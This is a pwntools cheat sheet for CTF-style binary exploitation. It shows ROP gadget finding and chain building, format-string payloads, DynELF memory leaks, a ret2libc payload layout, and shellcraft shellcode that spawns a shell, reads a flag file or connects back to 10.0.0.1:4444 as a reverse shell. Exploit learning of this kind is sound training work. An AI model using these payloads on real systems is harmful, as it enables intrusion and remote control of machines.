# pwntools Advanced Usage

```python
# Pwntools power techniques
from pwn import *

# Auto-context
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'  # see all sent/received data

# Process/Remote
# p = process('./binary', env={'LD_PRELOAD': './libc.so.6'})
# p = remote('ctf.example.com', 1337)

# Advanced ROP building
elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Find specific gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]

# Automatic ROP chain building
rop.system(b'/bin/sh\x00')  # auto-finds gadgets!

# Shellcraft
shellcode = shellcraft.sh()  # or shellcraft.amd64.linux.sh()
shellcode = shellcraft.cat('flag.txt')
shellcode = shellcraft.connect('10.0.0.1', 4444) + shellcraft.dupio()

# Format string helpers
payload = fmtstr_payload(6, {target_addr: 0xdeadbeef})

# DynELF — remote library resolver
def leak(addr):
    # read 8 bytes from arbitrary address
    p.send(p64(addr))
    return u64(p.recv(8))

d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')

# FmtStr — format string automation
execve_bin_sh = FmtStr(exec_fmt, offset=6)

# Corefile analysis
core = Core('./core')
print(f'RIP: {hex(core.rip)}')
print(f'RSP: {hex(core.rsp)}')
stack = core.stack  # read stack contents at crash

# GDB integration
# gdb.attach(p, '''
# b *0x400123
# continue
# ''')

# Cyclic pattern
offset = cyclic_find(0x61616174)  # find offset from crash value

# Flat — layout payloads cleanly
payload = flat({
    0: b'A' * offset,
    offset: p64(pop_rdi),
    offset + 8: p64(bin_sh),
    offset + 16: p64(system_addr),
})

# Logging
log.info(f'libc base: {hex(libc_base)}')
log.success('Exploit worked!')
log.warning('Partial success')
log.error('Exploit failed!')
```

---
